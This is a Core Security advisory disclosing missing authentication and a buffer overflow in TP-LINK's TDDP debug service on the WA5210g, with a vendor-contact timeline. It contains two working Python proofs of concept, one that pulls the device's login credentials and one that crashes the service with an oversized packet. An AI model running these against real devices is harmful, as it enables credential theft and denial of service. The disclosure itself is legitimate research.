@@ -1,0 +1,467 @@
+1. Advisory Information
+
+Title: TP-LINK TDDP Multiple Vulnerabilities
+Advisory ID: CORE-2016-0007
+Advisory URL: http://www.coresecurity.com/advisories/tp-link-tddp-multiple-vulnerabilities
+Date published: 2016-11-21
+Date of last update: 2016-11-18
+Vendors contacted: TP-Link
+Release mode: User release
+
+2. Vulnerability Information
+
+Class: Missing Authentication for Critical Function [CWE-306], Buffer Copy without Checking Size of Input ('Classic Buffer Overflow') [CWE-120]
+Impact: Code execution, Information leak
+Remotely Exploitable: Yes
+Locally Exploitable: No
+CVE Name: CVE-pending-assignment-1, CVE-pending-assignment-2
+
+3. Vulnerability Description
+
+TP-LINK [1] ships some of their devices with a debugging protocol activated by default. This debugging protocol is listening on the 1040 UDP port on the LAN interface.
+
+Vulnerabilities were found in the implementation of this protocol, that could lead to remote code execution and information leak (credentials acquisition).
+
+4. Vulnerable Devices
+
+TP-LINK WA5210g. (Firmware v1 and v2 are vulnerable)
+Other devices might be affected, but they were not tested.
+
+5. Vendor Information, Solutions and Workarounds
+
+No workarounds are available for this device.
+
+6. Credits
+
+This vulnerability was discovered and researched by Andres Lopez Luksenberg from Core Security Exploit Team. The publication of this advisory was coordinated by Joaquin Rodriguez Varela from Core Advisories Team.
+
+7. Technical Description / Proof of Concept Code
+
+TP-LINK distributes some of their hardware with a debugging service activate by default. This program uses a custom protocol. Vulnerabilities were found using this protocol, that could lead to remote code execution or information leak.
+
+7.1. Missing Authentication for TDDP v1
+
+[CVE-pending-assignment-1] If version 1 is selected when communicating with the TDDP service, there is a lack of authentication in place. Additionally if the message handler accepts the "Get configuration" message type, this will result in the program leaking the web interface configuration file, which includes the web login credentials.
+
+The following is a proof of concept to demonstrate the vulnerability (Impacket [2] is required for the PoC to work):
+
+ 
+import socket
+import re
+from impacket.winregistry import hexdump
+from impacket.structure import Structure
+import struct
+
+class TDDP(Structure):
+    structure = (
+       ('version','B=0x1'),
+       ('type','B=0'),      
+       ('code','B=0'),
+       ('replyInfo','B=0'),
+       ('packetLength','>L=0'),
+       ('pktID','<H=1'),
+       ('subType','B=0'),
+       ('reserved','B=0'),
+       ('payload',':=""'),       
+    )
+    def printPayload(self):
+        print self.getPayloadAsString()
+   
+    def getPayloadAsString(self):
+        s=''
+        for i in range(len(self['payload'])):
+            s += "%.2X" % struct.unpack("B", self['payload'][i])[0]
+        return s
+
+
+class TDDPRequestsPacketBuilder(object):
+    SET_CONFIG = 1
+    GET_CONFIG = 2
+    CMD_SYS0_PR = 3
+    GET_SERIAL_NUMBER = 5
+   
+    GET_PRODUCT_ID = 10   
+   
+    def getRequestPacket(self):
+        tddp = TDDP()
+        tddp['version'] = 1
+        tddp['replyInfo'] = 1       
+        return tddp
+   
+    def getConfigPacket(self):
+        tddp = self.getRequestPacket()
+        tddp['type'] = self.GET_CONFIG
+        tddp['payload'] = ('\x00'*0x10) + 'all'
+        tddp['packetLength'] = len(tddp['payload'])
+        return tddp
+
+    def setConfigPacket(self, trail):
+        tddp = self.getRequestPacket()
+        tddp['type'] = self.SET_CONFIG
+        tddp['payload'] = ('\x00'*0x10) + trail
+        tddp['packetLength'] = len(tddp['payload'])
+        return tddp
+       
+    def getSerialNumberPacket(self):
+        tddp = self.getRequestPacket()
+        tddp['type'] = self.GET_SERIAL_NUMBER
+        return tddp
+
+    def getProductIDPacket(self):
+        tddp = self.getRequestPacket()
+        tddp['type'] = self.GET_PRODUCT_ID
+        return tddp
+   
+    def CMD_SYS0_PR_Packet(self, trail):
+        tddp = self.getRequestPacket()
+        tddp['type'] = self.CMD_SYS0_PR
+        tddp['replyInfo'] = 2
+        tddp['payload'] = ('\x00'*0x10)
+        tddp['packetLength'] = len(tddp['payload'])
+        tddp['payload'] += trail
+        return tddp
+       
+
+class TPLINKConfig(object):
+    def __init__(self, aConfig):
+        self.__parseConfig(aConfig)
+       
+    def __sanitizeKeyValue(self, k, v):
+        k = k.replace("\r", "")
+        k = k.replace("\n", "")
+       
+        v = v.replace("\r", "")
+        v = v.replace("\n", "")
+       
+        return k,v
+       
+    def __parseConfig(self, aConfig):
+        self.__key_order = []
+        self.Header = aConfig[:0x10]
+        pending = aConfig[0x10:]
+        k_v = re.findall("(.*?) (.*)", pending)
+       
+        for k, v in k_v:
+            k,v = self.__sanitizeKeyValue(k,v)
+            real_value = v.split(" ")
+            if len(real_value) == 1:
+                real_value = real_value[0]
+               
+            self.__dict__[k] = real_value
+            self.__key_order.append(k)
+           
+    def __str__(self):
+        cfg = []
+        cfg.append(self.Header)
+       
+        for k in self.__key_order:
+            value = self.__dict__[k]
+
+            if not isinstance(value, basestring):
+                str_value = " ".join(value)
+            else:
+                str_value = value
+           
+            line = "%s %s" % (k, str_value)
+           
+            cfg.append(line)
+       
+       
+        str_cfg =  "\r\n".join(cfg)
+       
+        return str_cfg
+       
+class TDDPSessionV1(object):
+    def __init__(self, ip, port=1040):
+        self.ip = ip
+        self.port = port
+        self.req_buidler = TDDPRequestsPacketBuilder()
+
+    def send(self, aPacket):
+        self.conn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        self.conn.sendto(str(aPacket), (self.ip, self.port))
+        self.conn.close()
+       
+    def recv(self, n):
+        udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        udp.bind(('', 61000))
+        data, addr = udp.recvfrom(n)
+        return TDDP(data)
+   
+    def _send_and_recv(self, packet, n):
+        self.send(packet)
+        return self.recv(n)
+   
+    #####################################
+    def getConfig(self):
+        c_packet = self.req_buidler.getConfigPacket()
+        return TPLINKConfig(self._send_and_recv(c_packet, 50000)['payload'])
+       
+    def getSerialNumber(self):
+        c_packet = self.req_buidler.getSerialNumberPacket()
+        return self._send_and_recv(c_packet, 50000).getPayloadAsString()
+       
+    def getProductID(self):
+        c_packet = self.req_buidler.getProductIDPacket()
+        return self._send_and_recv(c_packet, 50000).getPayloadAsString()
+       
+    def setInitState(self):
+        c_packet = self.req_buidler.CMD_SYS0_PR_Packet("init")
+        return self._send_and_recv(c_packet, 50000)
+       
+    def save(self):
+        c_packet = self.req_buidler.CMD_SYS0_PR_Packet("save")
+        self._send_and_recv(c_packet, 50000)
+       
+    def reboot(self):
+        c_packet = self.req_buidler.CMD_SYS0_PR_Packet("reboot")
+        self._send_and_recv(c_packet, 50000)
+
+    def clr_dos(self):
+        c_packet = self.req_buidler.CMD_SYS0_PR_Packet("clr_dos")
+        self._send_and_recv(c_packet, 50000)
+       
+    def setConfig(self, aConfig):
+        c_packet = self.req_buidler.setConfigPacket(str(aConfig))
+        self._send_and_recv(c_packet, 50000)
+ 
+HOST = "192.168.1.254"
+
+s = TDDPSessionV1(HOST)
+config = s.getConfig()
+print "user: ", config.lgn_usr
+print "pass: ", config.lgn_pwd
+
+
+ 
+7.2. Buffer Overflow in TDDP v1 protocol
+
+[CVE-pending-assignment-2] A buffer overflow vulnerability was found when sending a handcrafted "set configuration" message to the TDDP service with an extensive configuration file and forcing version 1 in the packet.
+
+The following is a proof of concept to demonstrate the vulnerability by crashing the TDDP service (Impacket [2] is required for the PoC to work). To reestablish the TDDP service the device must be restarted:
+
+ 
+import socket
+import re
+import string 
+from impacket.winregistry import hexdump
+from impacket.structure import Structure
+import struct
+
+
+class TDDP(Structure):
+    structure = (
+       ('version','B=0x1'),
+       ('type','B=0'),      
+       ('code','B=0'),
+       ('replyInfo','B=0'),
+       ('packetLength','>L=0'),
+       ('pktID','<H=1'),
+       ('subType','B=0'),
+       ('reserved','B=0'),
+       ('payload',':=""'),   
+    )
+    def printPayload(self):
+        print self.getPayloadAsString()
+   
+    def getPayloadAsString(self):
+        s=''
+        for i in range(len(self['payload'])):
+            s += "%.2X" % struct.unpack("B", self['payload'][i])[0]
+        return s
+        
+        
+class TDDPRequestsPacketBuilder(object):
+    SET_CONFIG = 1
+    GET_CONFIG = 2
+    CMD_SYS0_PR = 3
+    GET_SERIAL_NUMBER = 5
+   
+    GET_PRODUCT_ID = 10   
+   
+    def getRequestPacket(self):
+        tddp = TDDP()
+        tddp['version'] = 1
+        tddp['replyInfo'] = 1       
+        return tddp
+   
+    def getConfigPacket(self):
+        tddp = self.getRequestPacket()
+        tddp['type'] = self.GET_CONFIG
+        tddp['payload'] = ('\x00'*0x10) + 'all'
+        tddp['packetLength'] = len(tddp['payload'])
+        return tddp
+
+    def setConfigPacket(self, trail):
+        tddp = self.getRequestPacket()
+        tddp['type'] = self.SET_CONFIG
+        tddp['payload'] = ('\x00'*0x10) + trail
+        tddp['packetLength'] = len(tddp['payload'])
+        return tddp
+       
+    def getSerialNumberPacket(self):
+        tddp = self.getRequestPacket()
+        tddp['type'] = self.GET_SERIAL_NUMBER
+        return tddp
+
+    def getProductIDPacket(self):
+        tddp = self.getRequestPacket()
+        tddp['type'] = self.GET_PRODUCT_ID
+        return tddp
+   
+    def CMD_SYS0_PR_Packet(self, trail):
+        tddp = self.getRequestPacket()
+        tddp['type'] = self.CMD_SYS0_PR
+        tddp['replyInfo'] = 2
+        tddp['payload'] = ('\x00'*0x10)
+        tddp['packetLength'] = len(tddp['payload'])
+        tddp['payload'] += trail
+        return tddp
+       
+       
+class TPLINKConfig(object):
+    def __init__(self, aConfig):
+        self.__parseConfig(aConfig)
+       
+    def __sanitizeKeyValue(self, k, v):
+        k = k.replace("\r", "")
+        k = k.replace("\n", "")
+       
+        v = v.replace("\r", "")
+        v = v.replace("\n", "")
+       
+        return k,v
+       
+    def __parseConfig(self, aConfig):
+        self.__key_order = []
+        self.Header = aConfig[:0x10]
+        pending = aConfig[0x10:]
+        k_v = re.findall("(.*?) (.*)", pending)
+       
+        for k, v in k_v:
+            k,v = self.__sanitizeKeyValue(k,v)
+            real_value = v.split(" ")
+            if len(real_value) == 1:
+                real_value = real_value[0]
+               
+            self.__dict__[k] = real_value
+            self.__key_order.append(k)
+           
+    def __str__(self):
+        cfg = []
+        cfg.append(self.Header)
+       
+        for k in self.__key_order:
+            value = self.__dict__[k]
+
+            if not isinstance(value, basestring):
+                str_value = " ".join(value)
+            else:
+                str_value = value
+           
+            line = "%s %s" % (k, str_value)
+           
+            cfg.append(line)
+       
+       
+        str_cfg =  "\r\n".join(cfg)
+       
+        return str_cfg
+        
+        
+class TDDPSessionV1(object):
+    def __init__(self, ip, port=1040):
+        self.ip = ip
+        self.port = port
+        self.req_buidler = TDDPRequestsPacketBuilder()
+
+    def send(self, aPacket):
+        self.conn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        self.conn.sendto(str(aPacket), (self.ip, self.port))
+        self.conn.close()
+        
+    def recv(self, n):
+        udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        udp.bind(('', 61000))
+        data, addr = udp.recvfrom(n)
+        return TDDP(data)
+    
+    def _send_and_recv(self, packet, n):
+        self.send(packet)
+        return self.recv(n)
+    
+    #####################################
+    def getConfig(self):
+        c_packet = self.req_buidler.getConfigPacket()
+        return TPLINKConfig(self._send_and_recv(c_packet, 50000)['payload'])
+        
+    def getSerialNumber(self):
+        c_packet = self.req_buidler.getSerialNumberPacket()
+        return self._send_and_recv(c_packet, 50000).getPayloadAsString()
+        
+    def getProductID(self):
+        c_packet = self.req_buidler.getProductIDPacket()
+        return self._send_and_recv(c_packet, 50000).getPayloadAsString()
+        
+    def setInitState(self):
+        c_packet = self.req_buidler.CMD_SYS0_PR_Packet("init")
+        return self._send_and_recv(c_packet, 50000)
+        
+    def save(self):
+        c_packet = self.req_buidler.CMD_SYS0_PR_Packet("save")
+        self._send_and_recv(c_packet, 50000)
+        
+    def reboot(self):
+        c_packet = self.req_buidler.CMD_SYS0_PR_Packet("reboot")
+        self._send_and_recv(c_packet, 50000)
+
+    def clr_dos(self):
+        c_packet = self.req_buidler.CMD_SYS0_PR_Packet("clr_dos")
+        self._send_and_recv(c_packet, 50000)
+        
+    def setConfig(self, aConfig):
+        c_packet = self.req_buidler.setConfigPacket(str(aConfig))
+        self._send_and_recv(c_packet, 50000)
+        
+        
+class Exploit(TDDPSessionV1):
+    def run(self):
+        c_packet = self.req_buidler.getRequestPacket()
+        c_packet['type'] = self.req_buidler.SET_CONFIG        
+        c_packet['payload'] = "A"*325
+        c_packet['packetLength'] = 0x0264           
+        return self.send(c_packet)
+
+HOST = "192.168.1.254"
+PORT = 1040		
+s = Exploit(HOST)
+s.run()
+	  
+ 
+8. Report Timeline
+
+2016-10-04: Core Security sent an initial notification to TP-Link.
+2016-10-07: Core Security sent a second notification to TP-Link.
+2016-10-31: Core Security sent a third notification to TP-Link through Twitter.
+2016-11-09: Core Security sent a fourth notification to TP-Link through email and Twitter without receiving any response whatsoever.
+2016-11-10: Core Security sent a request to Mitre for two CVE ID's for this advisory.
+2016-11-12: Mitre replied that the vulnerabilities didn't affected products that were in the scope for CVE.
+2016-11-21: Advisory CORE-2016-0007 published.
+9. References
+
+[1] http://www.tplink.com/. 
+[2] https://www.coresecurity.com/corelabs-research/open-source-tools/impacket. 
+
+10. About CoreLabs
+
+CoreLabs, the research center of Core Security, is charged with anticipating the future needs and requirements for information security technologies. We conduct our research in several important areas of computer security including system vulnerabilities, cyber attack planning and simulation, source code auditing, and cryptography. Our results include problem formalization, identification of vulnerabilities, novel solutions and prototypes for new technologies. CoreLabs regularly publishes security advisories, technical papers, project information and shared software tools for public use at: http://corelabs.coresecurity.com.
+
+11. About Core Security
+
+Courion and Core Security have rebranded the combined company, changing its name to Core Security, to reflect the company's strong commitment to providing enterprises with market-leading, threat-aware, identity, access and vulnerability management solutions that enable actionable intelligence and context needed to manage security risks across the enterprise. Core Security's analytics-driven approach to security enables customers to manage access and identify vulnerabilities, in order to minimize risks and maintain continuous compliance. Solutions include Multi-Factor Authentication, Provisioning, Identity Governance and Administration (IGA), Identity and Access Intelligence (IAI), and Vulnerability Management (VM). The combination of these solutions provides context and shared intelligence through analytics, giving customers a more comprehensive view of their security posture so they can make more informed, prioritized, and better security remediation decisions.
+
+Core Security is headquartered in the USA with offices and operations in South America, Europe, Middle East and Asia. To learn more, contact Core Security at (678) 304-4500 or info@coresecurity.com.
+
+12. Disclaimer
+
+The contents of this advisory are copyright (c) 2016 Core Security and (c) 2016 CoreLabs, and are licensed under a Creative Commons Attribution Non-Commercial Share-Alike 3.0 (United States) License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/
